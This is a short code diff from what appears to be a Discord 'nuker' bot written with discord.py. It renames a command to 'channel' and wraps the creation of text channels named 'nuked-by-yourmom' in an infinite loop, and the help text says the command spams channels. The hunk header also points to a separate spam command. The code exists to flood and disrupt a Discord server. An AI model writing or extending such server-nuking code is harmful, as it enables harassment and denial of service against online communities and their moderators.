@@ -71,8 +71,10 @@ async def spam(ctx):
         
 #CreateChannel
 @client.command(name="channel", help="Spam's a amount of channel's")
-async def spam(ctx):
-    await ctx.guild.create_text_channel("nuked-by-yourmom")
+async def channel(ctx):
+    while(True):
+        
+        await ctx.guild.create_text_channel("nuked-by-yourmom")
     
 
 
